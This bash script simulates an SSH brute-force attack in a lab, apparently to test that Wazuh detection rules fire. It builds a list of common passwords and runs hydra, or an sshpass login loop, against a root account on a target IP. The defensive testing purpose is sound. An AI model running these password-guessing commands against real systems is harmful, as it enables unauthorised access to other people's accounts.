#!/usr/bin/env bash
#
# Simulation: SSH brute force  (MITRE T1110)  ->  fires Wazuh rule 100001
# --------------------------------------------------------------------------
# LAB USE ONLY. Runs a burst of failed SSH logins against a target you own.
#
# Usage:
#   bash run.sh TARGET_IP=192.168.1.60 [TARGET_USER=root] [ATTEMPTS=12]
#
# To also demo rule 100002 (successful login after brute force), append the
# target's REAL password as the last entry of the wordlist below — only do this
# for an account you control.
#
set -euo pipefail
for a in "$@"; do case "$a" in *=*) export "${a%%=*}"="${a#*=}";; esac; done
TARGET_IP="${TARGET_IP:-127.0.0.1}"
TARGET_USER="${TARGET_USER:-root}"
ATTEMPTS="${ATTEMPTS:-12}"

echo "=============================================================="
echo " [LAB] SSH brute-force simulation  ->  ${TARGET_USER}@${TARGET_IP}"
echo " Expect Wazuh rule 100001 within ~90s. Ctrl-C to abort."
echo "=============================================================="

wordlist="$(mktemp)"
printf '%s\n' 123456 password admin root letmein qwerty 111111 changeme welcome1 P@ssw0rd toor abc123 > "$wordlist"
trap 'rm -f "$wordlist"' EXIT

if command -v hydra >/dev/null 2>&1; then
  echo "[*] Using hydra"
  hydra -l "$TARGET_USER" -P "$wordlist" -t 4 -W 1 -f "ssh://$TARGET_IP" || true
elif command -v sshpass >/dev/null 2>&1; then
  echo "[*] Using sshpass loop ($ATTEMPTS attempts)"
  n=0
  while read -r pw; do
    n=$((n+1)); [ "$n" -le "$ATTEMPTS" ] || break
    sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
      -o PreferredAuthentications=password -o PubkeyAuthentication=no \
      "$TARGET_USER@$TARGET_IP" true 2>/dev/null || true
    printf '.'
  done < "$wordlist"; echo
else
  echo "[x] Need 'hydra' or 'sshpass'. Install one:  sudo apt-get install -y hydra"
  exit 1
fi

echo "[+] Done. Check the dashboard: Threat Hunting -> Events -> rule.id:100001"
